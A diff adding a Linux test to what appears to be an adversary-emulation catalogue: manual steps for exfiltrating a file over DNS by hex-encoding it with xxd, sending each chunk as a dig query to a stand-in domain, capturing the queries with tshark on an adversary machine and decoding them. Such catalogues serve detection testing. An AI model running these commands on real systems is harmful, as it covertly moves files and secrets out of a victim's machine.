@@ -27578,6 +27578,35 @@ exfiltration:
           1500, $Data) }
 
 '
+    - name: Exfiltration Over Alternative Protocol - DNS
+      description: 'Exfiltration of specified file over DNS protocol.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        domain:
+          description: target DNS domain
+          type: url
+          default: ns2.example.com
+        input_file:
+          description: Path to file to be exfiltrated.
+          type: Path
+          default: "./example.txt"
+        output_file:
+          description: Filename of the data exfiltrated.
+          type: String
+          default: received_data.txt
+      executor:
+        name: manual
+        steps: "1. On the adversary machine run the below command.\n\n    tshark -f
+          \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name
+          matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run
+          the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data
+          in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the
+          data is received, use the below command to recover the data.\n\n    cat
+          output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1
+          | sort | uniq | xxd -p -r"
 command-and-control:
   '':
     technique:
